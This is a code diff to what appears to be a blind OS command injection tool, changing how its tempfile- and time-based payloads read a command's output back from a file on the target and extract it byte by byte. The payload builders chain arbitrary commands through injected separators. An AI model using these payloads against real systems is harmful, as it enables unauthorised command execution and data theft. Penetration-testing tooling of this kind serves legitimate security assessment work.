@@ -37,41 +37,37 @@ its length however many lines it came in.
 def windows_cmd_text(cmd):
   return checks.windows_output_text(cmd)
 
-def flattened_file_text(OUTPUT_TEXTFILE):
+def file_text(OUTPUT_TEXTFILE):
   """
-  The file's contents as one line: every newline in it turned into a space.
+  The file's contents as the command wrote them, line breaks and all.
 
-  Output of any shape is measured and read back as a single string, so the newlines between lines
-  have to become something the one line can hold. Read by redirection rather than through a pipe,
-  because the separator under test is the only one a payload is allowed to chain itself with.
-  """
-  return "tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE
+  Read by redirection's opposite rather than through a pipe, because the separator under test is
+  the only one a payload is allowed to chain itself with - and the whole of it, where a reading
+  that joined the lines with a space used to stand: an output of several lines came back as one
+  paragraph, and the shape a target answered in was the part of the answer that was lost. The
+  ordinals every byte is read off are counted the same whether a byte is a newline or a letter, as
+  the delay-based technique's own reading of them already shows.
 
-def flattened_trimmed_text(OUTPUT_TEXTFILE):
-  """
-  The same one line, joined and trimmed in the one read, for a separator that cannot carry the
-  variable the two steps above pass between them.
-
-  Each rule holds a single statement, so the program needs no ';' of its own, and the join is
-  written as 'OFS' rather than a literal space - which a script rewriting whitespace would
-  otherwise rewrite inside awk's own quotes, where it is text rather than a separator.
-
-  >>> ";" in flattened_trimmed_text("/tmp/o.txt")
+  >>> ";" in file_text("/tmp/o.txt")
   False
-  >>> "|" in flattened_trimmed_text("/tmp/o.txt")
+  >>> "|" in file_text("/tmp/o.txt")
   False
-  >>> flattened_trimmed_text("/tmp/o.txt").endswith("/tmp/o.txt")
+  >>> file_text("/tmp/o.txt").endswith("/tmp/o.txt")
   True
   """
-  return ("awk 'NR>1{out=(out)(OFS)}{out=(out)($0)}END{print(out)}' " + OUTPUT_TEXTFILE)
+  return "cat " + OUTPUT_TEXTFILE
 
-def trimmed_output_text():
+def output_text():
   """
-  The flattened text without the space standing in for the trailing newline, which had been making
-  every result a character longer than it was. Matched as a class rather than written out, so that
-  a script rewriting whitespace cannot rewrite it, and suffix removal adds no command of its own.
+  What was read, written back as it stands.
+
+  A substitution hands back what it captured without the newlines it ended with and without
+  anything else, so by the time this is written the trailing newline is already gone. One trailing
+  whitespace character used to be taken off here as well, to drop the space the joining above left
+  in that newline's place - with nothing joined there is no such space, and taking one off anyway
+  took a character the command had printed: an output of 'ab ' came back as 'ab'.
   """
-  return "${" + settings.RANDOM_VAR_GENERATOR + "%[[:space:]]}"
+  return "${" + settings.RANDOM_VAR_GENERATOR + "}"
 
 """
 Tempfile-based decision payload (check if host is vulnerable).
@@ -202,8 +198,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       payload = (separator +
                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                 settings.BYTE_LOCALE_EXPORTED + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+                "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -219,7 +215,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       # the decimals are written last - after the delay has been scaled, since the word carrying
       # them is built before 'sleep' is run. Nothing here chains, so nothing is smuggled.
       measured = (settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
-                  settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + flattened_trimmed_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
+                  settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                   settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
       to_decimals = (settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                      settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
@@ -230,8 +226,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       # The "&&" this payload already carries holds the pin too, which "&" alone would background away.
       payload = (separator +
                 settings.BYTE_LOCALE_EXPORTED + "&&" +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
-                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
+                "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
@@ -246,8 +242,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       payload = (ampersand +
                 # The command the "&&" needs on its left, pinning while it is there.
                 settings.BYTE_LOCALE_EXPORTED + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"" + trimmed_output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+                "echo \"" + output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -456,8 +452,8 @@ def oracle_supported(separator):
   return bb_payloads._supported(separator) and separator != "|"
 
 """
-Write a command's output into the created file once, flattened to one line the same way the
-delay-based reading already flattens it - nothing here asks a question, so nothing here waits.
+Write a command's output into the created file once, read back the same way the delay-based
+reading reads it - nothing here asks a question, so nothing here waits.
 """
 def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
   if not oracle_supported(separator):
@@ -471,8 +467,8 @@ def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
   var = settings.RANDOM_VAR_GENERATOR
   payload = (separator +
             var + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
-            " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
-            "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE
+            " " + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+            "echo \"" + output_text() + "\" >" + OUTPUT_TEXTFILE
             )
   return checks.terminate_payload(payload, separator)
 
@@ -530,7 +526,15 @@ def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operat
     return ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return bb_payloads.get_char(separator, "type " + OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator)
-  ordinal = checks.byte_ordinal("$(cut -b" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")")
+  # Indexed into the whole of what the file holds rather than a byte per line of it. 'cut -b'
+  # answers once for every line, so on an output of more than one it answered with another line's
+  # byte, and with nothing at all for the lines shorter than the position asked for - which is why
+  # the file used to be joined into a single line before any of this was read. Taken by awk as an
+  # argument instead, the way the delay-based technique already takes its own bytes, a newline is
+  # a position like any other.
+  ordinal = checks.byte_ordinal(tb_payloads._ordinal_arg_byte(
+              settings.CMD_SUB_PREFIX + file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX,
+              num_of_chars))
   payload = separator + bb_payloads._decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal)
   return checks.terminate_payload(payload, separator)
 
